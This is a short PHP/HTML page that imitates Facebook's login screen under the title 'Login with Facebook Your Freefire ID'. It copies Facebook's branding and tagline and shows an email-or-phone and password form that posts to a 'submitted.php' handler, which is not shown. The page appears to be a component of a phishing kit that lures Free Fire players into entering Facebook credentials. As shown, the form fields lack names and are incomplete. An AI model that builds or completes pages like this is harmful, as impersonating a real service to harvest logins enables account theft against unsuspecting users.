<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with Facebook Your Freefire ID</title>
    <link rel="stylesheet" href="../styles/impartials/_loginwithfb.scss">
</head>

<body>
    <?php require '../includes/nav.inc.php'; ?>
    <section id="facebook">
        <div class="leftFb" id="left-fb">
            <h1>Facebook</h1>
            <h3>Connect with friends and the world around you on facebook .</h3>
        </div>
        <div class="rightFb">
            <form action="submitted.php" method="post">
                <div class="inputBox">
                    <input type="text" placeholder="Email or Phone Number">
                </div>
                <div class="inputBox">
                    <input type="password" placeholder="Password">
                </div>
                <div class="inputBox">
                    <input type="submit" value="Log In" class="btn">
                </div>
                <div class="inputBox">
                    <a href="#">Forgot password?</a>
                </div>
                <hr>
                <div class="inputBox">
                    <button class="btn" id="btn">create new account</button>
                </div>
            </form>
        </div>
    </section>
    <?php require '../includes/footer.inc.php'; ?>
</body>

</html>